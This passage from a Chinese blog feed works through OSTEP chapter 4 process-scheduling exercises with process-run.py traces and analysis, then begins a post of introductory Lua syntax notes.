  <span class="token number">4</span>        BLOCKED       RUN:cpu             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">5</span>        BLOCKED       RUN:cpu             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">6</span>        BLOCKED          DONE                           <span class="token number">1</span>
  <span class="token number">7</span>*   RUN:io_done          DONE             <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>猜想完全正确</p>
<h2 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a><strong>第四题</strong></h2><blockquote>
<p>现在探索另一些标志。一个重要的标志是-S，它决定了当进程发出 I/O 时系统如何<br>反应。将标志设置为 SWITCH_ON_END，在进程进行 I/O 操作时，系统将不会切换到另一<br>个进程，而是等待进程完成。当你运行以下两个进程时，会发生什么情况？一个执行 I/O，<br>另一个执行 CPU 工作。（-l 1:0,4:100 -c -S SWITCH_ON_END）</p>
</blockquote>
<p>阻塞了调度呗<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># python ./process-run.py -l 1:0,4:100 -c -S SWITCH_ON_END</span>

Time        PID: <span class="token number">0</span>        PID: <span class="token number">1</span>           CPU           IOs
  <span class="token number">1</span>         RUN:io         READY             <span class="token number">1</span>
  <span class="token number">2</span>        BLOCKED         READY                           <span class="token number">1</span>
  <span class="token number">3</span>        BLOCKED         READY                           <span class="token number">1</span>
  <span class="token number">4</span>        BLOCKED         READY                           <span class="token number">1</span>
  <span class="token number">5</span>        BLOCKED         READY                           <span class="token number">1</span>
  <span class="token number">6</span>        BLOCKED         READY                           <span class="token number">1</span>
  <span class="token number">7</span>*   RUN:io_done         READY             <span class="token number">1</span>
  <span class="token number">8</span>           DONE       RUN:cpu             <span class="token number">1</span>
  <span class="token number">9</span>           DONE       RUN:cpu             <span class="token number">1</span>
 <span class="token number">10</span>           DONE       RUN:cpu             <span class="token number">1</span>
 <span class="token number">11</span>           DONE       RUN:cpu             <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>没有问题，io操作的阻塞期间没被调度走</p>
<h2 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a><strong>第五题</strong></h2><blockquote>
<p>现在，运行相同的进程，但切换行为设置，在等待 I/O 时切换到另一个进程（-l 1:0,4:100<br>-c -S SWITCH_ON_IO）。现在会发生什么？利用-c 来确认你的答案是否正确。</p>
</blockquote>
<p>预期：和最初等价，即阻塞期间被调度走</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># python ./process-run.py -l 1:0,4:100 -c -S SWITCH_ON_IO </span>
Time        PID: <span class="token number">0</span>        PID: <span class="token number">1</span>           CPU           IOs
  <span class="token number">1</span>         RUN:io         READY             <span class="token number">1</span>
  <span class="token number">2</span>        BLOCKED       RUN:cpu             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">3</span>        BLOCKED       RUN:cpu             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">4</span>        BLOCKED       RUN:cpu             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">5</span>        BLOCKED       RUN:cpu             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">6</span>        BLOCKED          DONE                           <span class="token number">1</span>
  <span class="token number">7</span>*   RUN:io_done          DONE             <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>符合预期</p>
<h2 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a><strong>第六题</strong></h2><blockquote>
<p>另一个重要的行为是 I/O 完成时要做什么。利用-I IO_RUN_LATER，当 I/O 完成时，<br>发出它的进程不一定马上运行。相反，当时运行的进程一直运行。当你运行这个进程组合<br>时会发生什么？（./process-run.py -l 3:0,5:100,5:100,5:100 -S SWITCH_ON_IO -I IO_RUN_LATER -c -p）系统资源是否被有效利用？</p>
</blockquote>
<p>四个进程，一个为3次io，其余都是cpu操作，运行一下看看<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python ./process-run.py <span class="token parameter variable">-l</span> <span class="token number">3</span>:0,5:100,5:100,5:100 <span class="token parameter variable">-S</span> SWITCH_ON_IO <span class="token parameter variable">-I</span> IO_RUN_LATER <span class="token parameter variable">-c</span> <span class="token parameter variable">-p</span>
Time        PID: <span class="token number">0</span>        PID: <span class="token number">1</span>        PID: <span class="token number">2</span>        PID: <span class="token number">3</span>           CPU           IOs
  <span class="token number">1</span>         RUN:io         READY         READY         READY             <span class="token number">1</span>
  <span class="token number">2</span>        BLOCKED       RUN:cpu         READY         READY             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">3</span>        BLOCKED       RUN:cpu         READY         READY             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">4</span>        BLOCKED       RUN:cpu         READY         READY             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">5</span>        BLOCKED       RUN:cpu         READY         READY             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">6</span>        BLOCKED       RUN:cpu         READY         READY             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">7</span>*         READY          DONE       RUN:cpu         READY             <span class="token number">1</span>
  <span class="token number">8</span>          READY          DONE       RUN:cpu         READY             <span class="token number">1</span>
  <span class="token number">9</span>          READY          DONE       RUN:cpu         READY             <span class="token number">1</span>
 <span class="token number">10</span>          READY          DONE       RUN:cpu         READY             <span class="token number">1</span>
 <span class="token number">11</span>          READY          DONE       RUN:cpu         READY             <span class="token number">1</span>
 <span class="token number">12</span>          READY          DONE          DONE       RUN:cpu             <span class="token number">1</span>
 <span class="token number">13</span>          READY          DONE          DONE       RUN:cpu             <span class="token number">1</span>
 <span class="token number">14</span>          READY          DONE          DONE       RUN:cpu             <span class="token number">1</span>
 <span class="token number">15</span>          READY          DONE          DONE       RUN:cpu             <span class="token number">1</span>
 <span class="token number">16</span>          READY          DONE          DONE       RUN:cpu             <span class="token number">1</span>
 <span class="token number">17</span>    RUN:io_done          DONE          DONE          DONE             <span class="token number">1</span>
 <span class="token number">18</span>         RUN:io          DONE          DONE          DONE             <span class="token number">1</span>
 <span class="token number">19</span>        BLOCKED          DONE          DONE          DONE                           <span class="token number">1</span>
 <span class="token number">20</span>        BLOCKED          DONE          DONE          DONE                           <span class="token number">1</span>
 <span class="token number">21</span>        BLOCKED          DONE          DONE          DONE                           <span class="token number">1</span>
 <span class="token number">22</span>        BLOCKED          DONE          DONE          DONE                           <span class="token number">1</span>
 <span class="token number">23</span>        BLOCKED          DONE          DONE          DONE                           <span class="token number">1</span>
 <span class="token number">24</span>*   RUN:io_done          DONE          DONE          DONE             <span class="token number">1</span>
 <span class="token number">25</span>         RUN:io          DONE          DONE          DONE             <span class="token number">1</span>
 <span class="token number">26</span>        BLOCKED          DONE          DONE          DONE                           <span class="token number">1</span>
 <span class="token number">27</span>        BLOCKED          DONE          DONE          DONE                           <span class="token number">1</span>
 <span class="token number">28</span>        BLOCKED          DONE          DONE          DONE                           <span class="token number">1</span>
 <span class="token number">29</span>        BLOCKED          DONE          DONE          DONE                           <span class="token number">1</span>
 <span class="token number">30</span>        BLOCKED          DONE          DONE          DONE                           <span class="token number">1</span>
 <span class="token number">31</span>*   RUN:io_done          DONE          DONE          DONE             <span class="token number">1</span>

Stats: Total Time <span class="token number">31</span>
Stats: CPU Busy <span class="token number">21</span> <span class="token punctuation">(</span><span class="token number">67.74</span>%<span class="token punctuation">)</span>
Stats: IO Busy  <span class="token number">15</span> <span class="token punctuation">(</span><span class="token number">48.39</span>%<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>可以看到pid 0 完成一次io之后就干等着，一直到pid 3执行完才继续，后续的阻塞cpu就浪费着，所以利用率不高，不合理</p>
<h2 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a><strong>第七题</strong></h2><blockquote>
<p>现在运行相同的进程，但使用-I IO_RUN_IMMEDIATE 设置，该设置立即运行发出<br>I/O 的进程。这种行为有何不同？为什么运行一个刚刚完成 I/O 的进程会是一个好主意？</p>
</blockquote>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> python ./process-run.py <span class="token parameter variable">-l</span> <span class="token number">3</span>:0,5:100,5:100,5:100 <span class="token parameter variable">-S</span> SWITCH_ON_IO <span class="token parameter variable">-I</span> IO_RUN_IMMEDIATE <span class="token parameter variable">-c</span> <span class="token parameter variable">-p</span>
Time        PID: <span class="token number">0</span>        PID: <span class="token number">1</span>        PID: <span class="token number">2</span>        PID: <span class="token number">3</span>           CPU           IOs
  <span class="token number">1</span>         RUN:io         READY         READY         READY             <span class="token number">1</span>
  <span class="token number">2</span>        BLOCKED       RUN:cpu         READY         READY             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">3</span>        BLOCKED       RUN:cpu         READY         READY             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">4</span>        BLOCKED       RUN:cpu         READY         READY             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">5</span>        BLOCKED       RUN:cpu         READY         READY             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">6</span>        BLOCKED       RUN:cpu         READY         READY             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">7</span>*   RUN:io_done          DONE         READY         READY             <span class="token number">1</span>
  <span class="token number">8</span>         RUN:io          DONE         READY         READY             <span class="token number">1</span>
  <span class="token number">9</span>        BLOCKED          DONE       RUN:cpu         READY             <span class="token number">1</span>             <span class="token number">1</span>
 <span class="token number">10</span>        BLOCKED          DONE       RUN:cpu         READY             <span class="token number">1</span>             <span class="token number">1</span>
 <span class="token number">11</span>        BLOCKED          DONE       RUN:cpu         READY             <span class="token number">1</span>             <span class="token number">1</span>
 <span class="token number">12</span>        BLOCKED          DONE       RUN:cpu         READY             <span class="token number">1</span>             <span class="token number">1</span>
 <span class="token number">13</span>        BLOCKED          DONE       RUN:cpu         READY             <span class="token number">1</span>             <span class="token number">1</span>
 <span class="token number">14</span>*   RUN:io_done          DONE          DONE         READY             <span class="token number">1</span>
 <span class="token number">15</span>         RUN:io          DONE          DONE         READY             <span class="token number">1</span>
 <span class="token number">16</span>        BLOCKED          DONE          DONE       RUN:cpu             <span class="token number">1</span>             <span class="token number">1</span>
 <span class="token number">17</span>        BLOCKED          DONE          DONE       RUN:cpu             <span class="token number">1</span>             <span class="token number">1</span>
 <span class="token number">18</span>        BLOCKED          DONE          DONE       RUN:cpu             <span class="token number">1</span>             <span class="token number">1</span>
 <span class="token number">19</span>        BLOCKED          DONE          DONE       RUN:cpu             <span class="token number">1</span>             <span class="token number">1</span>
 <span class="token number">20</span>        BLOCKED          DONE          DONE       RUN:cpu             <span class="token number">1</span>             <span class="token number">1</span>
 <span class="token number">21</span>*   RUN:io_done          DONE          DONE          DONE             <span class="token number">1</span>

Stats: Total Time <span class="token number">21</span>
Stats: CPU Busy <span class="token number">21</span> <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
Stats: IO Busy  <span class="token number">15</span> <span class="token punctuation">(</span><span class="token number">71.43</span>%<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>现在的策略是io结束了控制就回到pid 0继续，这样每一个io的阻塞期间都有进程运行，cpu得到了充分利用。</p>
<p>至于为什么运行一个刚刚完成 I/O 的进程会是一个好主意，如果认为程序<del>有良好的局部性</del>在一次io之后接着io的可能性比较大，那么考虑到io操作较长时间的阻塞，把其它cpu操作尽可能放在阻塞期间执行显然是好主意</p>
<h2 id="第八题"><a href="#第八题" class="headerlink" title="第八题"></a><strong>第八题</strong></h2><blockquote>
<p>现在运行一些随机生成的进程，例如-s 1 -l 3:50,3:50, -s 2 -l 3:50,3:50, -s 3 -l 3:50,3:50。<br>看看你是否能预测追踪记录会如何变化？当你使用-I IO<em>RUN_IMMEDIATE 与-I IO_RUN</em><br>LATER 时会发生什么？当你使用-S SWITCH_ON_IO 与-S SWITCH_ON_END 时会发生什么？</p>
</blockquote>
<p>先看一眼-s参数的含义：SEED, —seed=SEED  the random seed 用于生成随机数的<br>也就是两个进程，各3个操作，期中cpu操作和io操作的概率为各50%</p>
<p>开放性试题，随便做几个试一试：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># python .\process-run.py -s 2 -l 3:50,3:50 -I IO_RUN_IMMEDIATE -c</span>
Time        PID: <span class="token number">0</span>        PID: <span class="token number">1</span>           CPU           IOs
  <span class="token number">1</span>         RUN:io         READY             <span class="token number">1</span>
  <span class="token number">2</span>        BLOCKED       RUN:cpu             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">3</span>        BLOCKED        RUN:io             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">4</span>        BLOCKED       BLOCKED                           <span class="token number">2</span>
  <span class="token number">5</span>        BLOCKED       BLOCKED                           <span class="token number">2</span>
  <span class="token number">6</span>        BLOCKED       BLOCKED                           <span class="token number">2</span>
  <span class="token number">7</span>*   RUN:io_done       BLOCKED             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">8</span>         RUN:io       BLOCKED             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">9</span>*       BLOCKED   RUN:io_done             <span class="token number">1</span>             <span class="token number">1</span>
 <span class="token number">10</span>        BLOCKED        RUN:io             <span class="token number">1</span>             <span class="token number">1</span>
 <span class="token number">11</span>        BLOCKED       BLOCKED                           <span class="token number">2</span>
 <span class="token number">12</span>        BLOCKED       BLOCKED                           <span class="token number">2</span>
 <span class="token number">13</span>        BLOCKED       BLOCKED                           <span class="token number">2</span>
 <span class="token number">14</span>*   RUN:io_done       BLOCKED             <span class="token number">1</span>             <span class="token number">1</span>
 <span class="token number">15</span>        RUN:cpu       BLOCKED             <span class="token number">1</span>             <span class="token number">1</span>
 <span class="token number">16</span>*          DONE   RUN:io_done             <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># python .\process-run.py -s 2 -l 3:50,3:50 -I IO_RUN_LATER -c </span>
Time        PID: <span class="token number">0</span>        PID: <span class="token number">1</span>           CPU           IOs
  <span class="token number">1</span>         RUN:io         READY             <span class="token number">1</span>
  <span class="token number">2</span>        BLOCKED       RUN:cpu             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">3</span>        BLOCKED        RUN:io             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">4</span>        BLOCKED       BLOCKED                           <span class="token number">2</span>
  <span class="token number">5</span>        BLOCKED       BLOCKED                           <span class="token number">2</span>
  <span class="token number">6</span>        BLOCKED       BLOCKED                           <span class="token number">2</span>
  <span class="token number">7</span>*   RUN:io_done       BLOCKED             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">8</span>         RUN:io       BLOCKED             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">9</span>*       BLOCKED   RUN:io_done             <span class="token number">1</span>             <span class="token number">1</span>
 <span class="token number">10</span>        BLOCKED        RUN:io             <span class="token number">1</span>             <span class="token number">1</span>
 <span class="token number">11</span>        BLOCKED       BLOCKED                           <span class="token number">2</span>
 <span class="token number">12</span>        BLOCKED       BLOCKED                           <span class="token number">2</span>
 <span class="token number">13</span>        BLOCKED       BLOCKED                           <span class="token number">2</span>
 <span class="token number">14</span>*   RUN:io_done       BLOCKED             <span class="token number">1</span>             <span class="token number">1</span>
 <span class="token number">15</span>        RUN:cpu       BLOCKED             <span class="token number">1</span>             <span class="token number">1</span>
 <span class="token number">16</span>*          DONE   RUN:io_done             <span class="token number">1</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>嗯，这一组没体现出区别。io结束之后立即切换和下一次阻塞时切换两种策略的结果一致。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python .<span class="token punctuation">\</span>process-run.py <span class="token parameter variable">-s</span> <span class="token number">2</span> <span class="token parameter variable">-l</span> <span class="token number">3</span>:50,3:50 <span class="token parameter variable">-S</span> SWITCH_ON_END <span class="token parameter variable">-c</span>
Time        PID: <span class="token number">0</span>        PID: <span class="token number">1</span>           CPU           IOs
  <span class="token number">1</span>         RUN:io         READY             <span class="token number">1</span>
  <span class="token number">2</span>        BLOCKED         READY                           <span class="token number">1</span>
  <span class="token number">3</span>        BLOCKED         READY                           <span class="token number">1</span>
  <span class="token number">4</span>        BLOCKED         READY                           <span class="token number">1</span>
  <span class="token number">5</span>        BLOCKED         READY                           <span class="token number">1</span>
  <span class="token number">6</span>        BLOCKED         READY                           <span class="token number">1</span>
  <span class="token number">7</span>*   RUN:io_done         READY             <span class="token number">1</span>
  <span class="token number">8</span>         RUN:io         READY             <span class="token number">1</span>
  <span class="token number">9</span>        BLOCKED         READY                           <span class="token number">1</span>
 <span class="token number">10</span>        BLOCKED         READY                           <span class="token number">1</span>
 <span class="token number">11</span>        BLOCKED         READY                           <span class="token number">1</span>
 <span class="token number">12</span>        BLOCKED         READY                           <span class="token number">1</span>
 <span class="token number">13</span>        BLOCKED         READY                           <span class="token number">1</span>
 <span class="token number">14</span>*   RUN:io_done         READY             <span class="token number">1</span>
 <span class="token number">15</span>        RUN:cpu         READY             <span class="token number">1</span>
 <span class="token number">16</span>           DONE       RUN:cpu             <span class="token number">1</span>
 <span class="token number">17</span>           DONE        RUN:io             <span class="token number">1</span>
 <span class="token number">18</span>           DONE       BLOCKED                           <span class="token number">1</span>
 <span class="token number">19</span>           DONE       BLOCKED                           <span class="token number">1</span>
 <span class="token number">20</span>           DONE       BLOCKED                           <span class="token number">1</span>
 <span class="token number">21</span>           DONE       BLOCKED                           <span class="token number">1</span>
 <span class="token number">22</span>           DONE       BLOCKED                           <span class="token number">1</span>
 <span class="token number">23</span>*          DONE   RUN:io_done             <span class="token number">1</span>
 <span class="token number">24</span>           DONE        RUN:io             <span class="token number">1</span>
 <span class="token number">25</span>           DONE       BLOCKED                           <span class="token number">1</span>
 <span class="token number">26</span>           DONE       BLOCKED                           <span class="token number">1</span>
 <span class="token number">27</span>           DONE       BLOCKED                           <span class="token number">1</span>
 <span class="token number">28</span>           DONE       BLOCKED                           <span class="token number">1</span>
 <span class="token number">29</span>           DONE       BLOCKED                           <span class="token number">1</span>
 <span class="token number">30</span>*          DONE   RUN:io_done             <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>io结束才切换，程序变成了全异步的。-S SWITCH_ON_IO应该和前两种是一致的，也做一下：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># python .\process-run.py -s 2 -l 3:50,3:50 -S SWITCH_ON_IO -c </span>
Time        PID: <span class="token number">0</span>        PID: <span class="token number">1</span>           CPU           IOs
  <span class="token number">1</span>         RUN:io         READY             <span class="token number">1</span>
  <span class="token number">2</span>        BLOCKED       RUN:cpu             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">3</span>        BLOCKED        RUN:io             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">4</span>        BLOCKED       BLOCKED                           <span class="token number">2</span>
  <span class="token number">5</span>        BLOCKED       BLOCKED                           <span class="token number">2</span>
  <span class="token number">6</span>        BLOCKED       BLOCKED                           <span class="token number">2</span>
  <span class="token number">7</span>*   RUN:io_done       BLOCKED             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">8</span>         RUN:io       BLOCKED             <span class="token number">1</span>             <span class="token number">1</span>
  <span class="token number">9</span>*       BLOCKED   RUN:io_done             <span class="token number">1</span>             <span class="token number">1</span>
 <span class="token number">10</span>        BLOCKED        RUN:io             <span class="token number">1</span>             <span class="token number">1</span>
 <span class="token number">11</span>        BLOCKED       BLOCKED                           <span class="token number">2</span>
 <span class="token number">12</span>        BLOCKED       BLOCKED                           <span class="token number">2</span>
 <span class="token number">13</span>        BLOCKED       BLOCKED                           <span class="token number">2</span>
 <span class="token number">14</span>*   RUN:io_done       BLOCKED             <span class="token number">1</span>             <span class="token number">1</span>
 <span class="token number">15</span>        RUN:cpu       BLOCKED             <span class="token number">1</span>             <span class="token number">1</span>
 <span class="token number">16</span>*          DONE   RUN:io_done             <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>符合预期</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;第四章课后题&quot;&gt;&lt;a href=&quot;#第四章课后题&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="OSTEP" scheme="https://aucept.in/categories/OSTEP/"/>
    
    
    <category term="OSTEP" scheme="https://aucept.in/tags/OSTEP/"/>
    
    <category term="操作系统" scheme="https://aucept.in/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>lua学习笔记（持续更新中）</title>
    <link href="https://aucept.in/2025/06/24/lua%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://aucept.in/2025/06/24/lua%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2025-06-24T03:16:58.000Z</published>
    <updated>2025-12-27T08:57:28.934Z</updated>
    
    <content type="html"><![CDATA[<h2 id="🌙-前言"><a href="#🌙-前言" class="headerlink" title="🌙 前言"></a>🌙 前言</h2><p>开始之前先记录一下与lua的结缘过程：</p>
<ul>
<li>Noita的法术编程系统是用lua写的，早就想从源码层面研究一下noita了</li>
<li>上学期cpp课老师建议我用lua给我的小游戏写个引擎</li>
<li>lua是葡萄牙语中”<strong>月亮</strong>“的意思，对美丽的名字没有任何抵抗力！</li>
<li>听说了一些诸如某初中生在 nspire 上用lua 写东西的故事</li>
</ul>
<p>总而言之，既c和cpp之后第三门认真学的语言（是的到现在py、js、java、html、asm还没认真学过）就这么愉快的决定了</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><div class="note info flat"><p><strong>在线运行环境</strong>：<a href="https://wiki.luatos.com/_static/luatos-emulator/lua.html">可以在网页里运行</a></p>
</div>
<div class="note info flat"><p><a href="https://sourceforge.net/projects/luabinaries/files/5.4.2/">windows解释器</a></p>
</div>
<p>把.exe文件所在目录添加到环境变量里即可，lua对环境的要求很低</p>
<h2 id="资料"><a href="#资料" class="headerlink" title="资料"></a>资料</h2><div class="note info flat"><p><a href="https://wiki.luatos.com/index.html">中文文档</a></p>
</div>
<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello world"></a>Hello world</h3><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"hello world"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>简洁明了</p>
<h3 id="变量声明"><a href="#变量声明" class="headerlink" title="变量声明"></a>变量声明</h3><p>赋值就是声明，默认为全局变量，加上local关键字变为局部变量</p>
<p>一切没声明的变量都是nil</p>
<p>支持多重赋值：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua">a<span class="token punctuation">,</span>b <span class="token operator">=</span> <span class="token number">1</span> <span class="token punctuation">,</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><ul>
<li><strong>number</strong>: lua的数字只有一个类型，为c里的double，支持16进制表示、科学计数法、左移右移运算</li>
<li><strong>string</strong>: 单/双引号之间的就是字符串，支持转义字符。多行文本可以用<code>[[string]]</code>表示，会保存换行。<ul>
<li>连接字符串使用<code>..</code>运算符</li>
<li><code>tostring</code> <code>tonumber</code>函数，没有报错只有返回nil</li>
<li><code>#</code>表示获取长度</li>
</ul>
</li>
</ul>
<p>使用函数type可获取一个值对应的类型名称</p>
<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><ul>
<li>声明函数的关键字 <code>function</code></li>
<li>作用域用<code>end</code>标识，很有特色</li>
<li>返回值默认是nil， 参数没传值也默认成nil</li>
<li>可以有多个返回值</li>
</ul>
<pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span>c<span class="token punctuation">)</span>
    <span class="token keyword">local</span> i <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> b 
    <span class="token keyword">local</span> j <span class="token operator">=</span> <span class="token string">"deadbeef"</span> <span class="token operator">..</span> c
    <span class="token keyword">return</span> i<span class="token punctuation">,</span>j
<span class="token keyword">end</span>

c <span class="token operator">=</span> <span class="token number">1</span>
d <span class="token operator">=</span> <span class="token string">"a"</span>
e<span class="token punctuation">,</span>f <span class="token operator">=</span> <span class="token function">a</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">)</span>
<span class="token function">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
<span class="token function">print</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以用…表示不定长参数<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">function</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">...</span><span class="token punctuation">)</span>
  <span class="token keyword">local</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c <span class="token operator">=</span> <span class="token punctuation">...</span>
  <span class="token keyword">return</span> <span class="token punctuation">...</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p>
<h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>数组这个名字实在是配不上lua的table，因为这是一种用起来极为强大的数据结构，比vector、array等都强太多了</p>
<p>table用大括号声明，不同元素用”,”分隔，可以存<strong>任何类型</strong>的数据，包括函数</p>
<p>索引从1开始</p>
<p>同样可以用<code>#</code>获取长度，值为nil与不存在无异</p>
<p><strong>插入</strong>：<code>table.insert(tableName, (position), target)</code></p>
<p><strong>移除</strong>：<code>table.remove(tableName, position)</code> 返回值是对应位置的值</p>
<p>可以自由的调整table大小</p>
<p>如果存的是键值对，那table就是map。不符合命名规范的键可以用<code>[]</code>完成转义。同样，所有未定义的元素都是nil，同样一个值变成了nil就等同于未定义</p>
<p>在循环中提到了多种遍历方法</p>
<pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> table <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"hello"</span><span class="token punctuation">,</span> <span class="token keyword">true</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"这是一个函数"</span><span class="token punctuation">)</span> <span class="token keyword">end</span><span class="token punctuation">&#125;</span>

<span class="token comment">-- 访问元素</span>
<span class="token function">print</span><span class="token punctuation">(</span>fruits<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment">-- 输出: apple</span>
<span class="token function">print</span><span class="token punctuation">(</span>fruits<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment">-- 输出: banana</span>

<span class="token comment">-- 获取长度</span>
<span class="token function">print</span><span class="token punctuation">(</span><span class="token operator">#</span>fruits<span class="token punctuation">)</span>    <span class="token comment">-- 输出: 3</span>

<span class="token comment">-- 键值对形式（作为map使用）</span>
<span class="token keyword">local</span> table2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    name <span class="token operator">=</span> <span class="token string">"this is a name"</span><span class="token punctuation">,</span>
    <span class="token punctuation">[</span><span class="token number">01101001001</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">110011100110</span>
<span class="token punctuation">&#125;</span>

<span class="token function">print</span><span class="token punctuation">(</span>table2<span class="token punctuation">.</span>name<span class="token punctuation">)</span>        <span class="token comment">-- 输出: this is a name</span>
